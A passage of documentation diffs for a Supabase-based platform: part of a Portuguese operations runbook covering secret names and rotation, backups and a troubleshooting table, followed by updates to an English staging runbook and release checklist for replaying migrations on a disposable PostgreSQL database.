+| `MS_GRAPH_TENANT_ID`, `MS_GRAPH_CLIENT_ID`, `MS_GRAPH_CLIENT_SECRET` | sim se usar Outlook/Teams | Calendário, email, transcrições |
+| `MS_GRAPH_SHAREPOINT_DRIVE_ID` | sim se arquivar contratos | `archive-contracts-to-sharepoint` |
+| `DOCUSIGN_INTEGRATION_KEY`, `DOCUSIGN_USER_ID`, `DOCUSIGN_ACCOUNT_ID`, `DOCUSIGN_BASE_URL`, `DOCUSIGN_RSA_PRIVATE_KEY` | sim se usar DocuSign | `docusign-send-envelope` |
+| `PANDADOC_API_KEY`, `PANDADOC_WEBHOOK_KEY` | sim se usar PandaDoc | envio e webhook |
+| `TWILIO_API_KEY`, `TWILIO_PHONE_NUMBER` | não (função dormente) | `send-whatsapp-reminder` |
+| `STRIPE_SECRET_KEY` | não | `import-kpi-data` |
+| `RECONCILER_WRITE_MODE` | não | `reconciler-run` (escrita só com a variável E a definição ligadas) |
+| `PUBLIC_BOOKING_ALLOW_DEMO` | nunca em produção | Permite horários de demonstração |
+
+Rotação: gerar o novo valor no fornecedor, atualizar o Secret, confirmar o ponto 12 da secção 1 e só depois revogar o antigo. `CRON_SECRET` pode ser trocado sem janela (o cron usa tokens de uso único gerados na base de dados). `WEBHOOK_SECRET`, `PANDADOC_WEBHOOK_KEY` e os segredos DocuSign exigem atualizar o fornecedor ao mesmo tempo (haverá uma janela curta em que os webhooks falham).
+
+## 4. Cópias de segurança e restauro
+
+- Cópia de produto (diária, 03:00 UTC): `run-ecosystem-snapshot` grava 10 tabelas em JSON no bucket privado `ecosystem-backups`. NÃO inclui ficheiros (buckets `contract-documents`, `startup-documents`, ...), sessões, KPIs, notas, tarefas nem mensagens: não substitui um backup da base.
+- Base de dados: confirmar em Supabase → Database → Backups que os backups diários estão ativos e se o PITR (recuperação a um ponto no tempo) está contratado. Registar aqui a decisão: ______ (sem PITR, a perda máxima é 24 h).
+- Ensaio trimestral: criar projeto temporário, restaurar o backup mais recente, correr a secção 1 pontos 2, 3 e 10.
+- Antes de qualquer migração destrutiva ou importação em massa: descarregar um backup manual.
+
+## 5. Se algo falhar
+
+| Sintoma | Primeira ação |
+|---|---|
+| Automação `STALE`/`FAILING` | Abrir `cron_job_runs` desse job (`select * from cron_job_runs where job_name = '<job>' order by started_at desc limit 10`); se não há linhas, a função nem arrancou: ver Logs de Edge Functions e o `CRON_SECRET`/`SUPABASE_SERVICE_ROLE_KEY`. |
+| Emails não chegam | Resend → Logs; confirmar domínio verificado e `RESEND_API_KEY`; `notification_attempts` presas (ponto 7). |
+| Outlook/Teams parado | `email_sync_status` (ponto 7); `graph-config-status`; segredo do Graph expirado. |
+| Contrato assinado mas workspace inativo | Ponto 10; a recuperação de ativação (`dispatch_contract_activation_recovery`, função edge `reconcile-contract-activation`) retoma sozinha; se persistir, ver `contract_lifecycle_events`. |
+| Suspeita de fuga de dados | Desligar `open_registration`, ligar `notifications.founders_disabled`, rodar `CRON_SECRET` e `WEBHOOK_SECRET`, pedir a rotação da chave de serviço ao suporte da plataforma, correr o ponto 9. |
````

### `docs/rc5/staging-runbook.md`
_(de: Documentos de operação desatualizados (ids: OPS-14))_

**Alterar `docs/rc5/staging-runbook.md`** (diff; os números de linha são do ficheiro original):

````diff
--- a/docs/rc5/staging-runbook.md
+++ b/docs/rc5/staging-runbook.md
@@ -44,8 +44,9 @@ Preflight refuses to continue if:
 
 ```bash
-node scripts/rc5/migrate-fresh.mjs
+export RC5_DISPOSABLE_DATABASE_URL=postgresql://postgres:postgres@127.0.0.1:5432/postgres   # a throwaway PostgreSQL 17 (never staging or production)
+node scripts/rc5/migrate-fresh-replay.mjs
 ```
 
-Boots an ephemeral Postgres via `docker run --rm postgres:15`, applies every file under `supabase/migrations/` in timestamp order, then runs `supabase/tests/rls_policies.test.sql` via `pg_prove`. Prints a summary and exits non-zero on the first failure.
+Resets the `public` schema of the disposable database, applies `scripts/rc5/supabase-shim.sql`, then every file under `supabase/migrations/` in timestamp order with `psql -v ON_ERROR_STOP=1`. It exits non-zero on the first failing file. The baseline migration was dumped from PostgreSQL 17 (`SET transaction_timeout`), so the disposable database must be PostgreSQL 17. To replay on PostgreSQL 16 and run the pgTAP suites in one step, use `bash scripts/rc5/local-pg-harness.sh` instead (CI job `db-pgtap-local`).
 
 **Path B — forward apply** (staging clone):
@@ -57,4 +58,10 @@ node scripts/rc5/migrate-forward.mjs
 Captures preflight counts (see `docs/rc5/queries/preflight-counts.sql`), applies only the new migrations, captures postflight counts, and diffs. Non-zero on unexpected row-count deltas outside the `rc5-e2e-` namespace.
 
+**Staging scheduler target.** The `cron_invoke_edge` jobs call the production Edge Functions unless the database knows its own base URL. On the staging database run once, then open a new session:
+
+```sql
+ALTER DATABASE postgres SET app.edge_base_url = 'https://<staging-ref>.supabase.co';
+```
+
 ## 3. Deterministic seed
````

### `docs/rc5/release-checklist.md`
_(de: Documentos de operação desatualizados (ids: OPS-14))_

**Alterar `docs/rc5/release-checklist.md`** (diff; os números de linha são do ficheiro original):

```diff
--- a/docs/rc5/release-checklist.md
+++ b/docs/rc5/release-checklist.md
@@ -17,5 +17,5 @@ Every box must be ticked with linked evidence (command output, screenshot, or fi
 ## Migration gates (staging)
 
-- [ ] `scripts/rc5/migrate-fresh.mjs` — fresh replay on disposable Postgres, all pgTAP assertions pass.
+- [ ] `scripts/rc5/migrate-fresh-replay.mjs` (or `scripts/rc5/local-pg-harness.sh`, which also runs the pgTAP suites) — fresh replay on disposable Postgres, all pgTAP assertions pass.
 - [ ] `scripts/rc5/migrate-forward.mjs` — forward apply on staging clone, safe preflight/postflight diff.
 - [ ] `SECURITY DEFINER` ownership audit (`docs/rc5/queries/definer-audit.sql`) — every definer function is owned by `postgres`, has pinned `search_path`, and its EXECUTE grant is minimal.
```
